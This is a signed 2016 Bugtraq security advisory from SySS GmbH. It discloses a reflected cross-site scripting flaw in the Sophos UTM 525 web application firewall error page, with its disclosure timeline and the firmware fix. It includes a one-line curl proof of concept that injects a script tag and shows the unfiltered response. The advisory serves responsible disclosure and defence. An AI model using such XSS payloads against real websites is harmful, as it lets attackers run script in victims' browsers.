
Date: Tue, 1 Mar 2016 10:52:20 GMT
From: adrian.vollmer@...s.de
To: bugtraq@...urityfocus.com
Subject: [SYSS-2016-009] Sophos UTM 525 Web Application Firewall -
 Cross-Site Scripting in

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

Advisory ID: SYSS-2016-009
Product: Sophos UTM 525 Full Guard 
Vendor: Sophos
Affected Version(s): 9.352-6, 94988 
Tested Version(s): 9.352-6, 94988 
Vulnerability Type: Cross-Site Scripting (CWE-79) 
Risk Level: Medium
Solution Status: Fixed
Vendor Notification: 2016-02-03
Solution Date: 2016-02-17
Public Disclosure: 2016-03-01
CVE Reference: Not assigned
Author of Advisory: Dr. Adrian Vollmer (SySS GmbH)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

The Sophos UTM 525 is a hardware appliance which aims to provide several
protection mechanisms for users and servers in an enterprise environment.
One if its functions is a Web Application Firewall (WAF).

The software manufacturer describes the application as follows (see [1]):

Sophos UTM 525 is designed to provide protection for larger enterprises.
Based on high quality Intel-compatible server systems, including Intel
Multi-Core processor technology and redundant hard disks and power 
supplies, it provides optimal performance and reliability even for 
larger environments.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

The SySS GmbH identified a text-book Cross-Site Scripting vulnerability.

Inserting an HTML 'script' tag into the URL of a web site protected by
Sophos UTM 525 yields an error page which contains the 'script' tag
unfiltered. Executing malicious JavaScript code in the victim's browser 
is therefore straightforward.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

The following Unix command demonstrates the vulnerability.

    $ curl 'https://[HOST]/%3Cscript%3Ealert("SySS%20XSS")%3C/script%3E'

    <html><head><title>Request blocked</title><meta name="robots"
    content="noindex"></head><body><h1>Request blocked</h1><p>The web
    application firewall has blocked access to <i>/<script>alert("SySS
    XSS")</script></i> for the following reason:</p><pre><b>No signature
    found</b></pre><hr></body></html>

The unfiltered 'script' tag is visible in the HTML source of the response
and the contained JavaScript code will be executed in the victim's 
browser.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution:

Update the firmware to version 9.354 or later [4].

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclosure Timeline:

2015-11-24: Vulnerability discovered
2016-02-03: Vulnerability reported to vendor
2016-02-17: Release of version 9.354
2016-03-01: Public release of security advisory

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

References:

[1] www.sophos.com/en-us/medialibrary/PDFs/factsheets/sophosutm525dsna.pdf?la=en-us
[2] SySS GmbH, SYSS-2016-009 
    https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/2016/SYSS-2016-009.txt
[3] SySS GmbH, SySS Responsible Disclosure Policy
    https://www.syss.de/en/news/responsible-disclosure-policy/
[4] https://blogs.sophos.com/2016/02/17/utm-up2date-9-354-released/

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Credits:

Security vulnerability found by Dr. Adrian Vollmer of SySS GmbH.

E-Mail: adrian.vollmer@...s.de
Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Adrian_Vollmer.asc
Key ID: 0x037C9FE7
Key Fingerprint: 70CF E88C AEE7 DB0F 5DC8 3403 0E02 7C7E 037C 9FE7

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclaimer:

The information provided in this security advisory is provided "as is" 
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of  this security advisory is available on the SySS Web
site.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Copyright:

Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCAAGBQJW1XPsAAoJEA4CfH4DfJ/nxZIQANaccfjx9phCr6iP3cy53i16
iun/WHe0nxvGoVmVmj2SwyvXzQwI8nU5jvu2AwlJ2rVhgLQFACCyyWaEs2r5yyKn
yT4hGgSwqCKbLk18ozaJ0NfCQD4PvCi/3I/8Gzy+iqRG87DVUbBtDWp1RDnnfovt
mhp9JakZuKImuL/DJ0PNbA6hVYQvi1HoWVh/3j7WJQpQ9NjlLJhce43deTA9IPtx
3ggtd8/6BcAY5nui3YSfDp2p6EvAu8VnBjSvUOzmEr5YKkwI3CcGnLui5XMV8I0Z
SUyq9wXb2p1ycTvR+p3rs+ZS4PF40Hmjp49ibojr/19Cv1CFic/mrRkEbgfBT8N1
LKJeLHJePE0B0JwUyZjTaMW8WffHztrBgt1ueJYkx8hQE/yDvrb5iCRapTQ9ffMA
1gPNyL13lRaYO8F6dHo/nMEdxDkR2ubgNvhu1jEwXOQDeeTSpMA5d0uZLm9m7y7c
WlGk50FhD6BKnzpaq+emTEUkKlgVmi+DedHE5ipeveFEDaQ46l1rloW0u5mCOzZd
/8pKzIyqMX78L0iHItx65LC/GX9gZvIp9dTeq5fjmPAic9kAfBNUdjJMdgg3boRB
/nEuCZfdkdBENoqWYPhiZim59ap8vzQmOzck6E+KJp/vLmFyeL0vpTbhlz2ebDs3
n0R7GMOr3ZPEbshPROg4
=kxkb
-----END PGP SIGNATURE-----
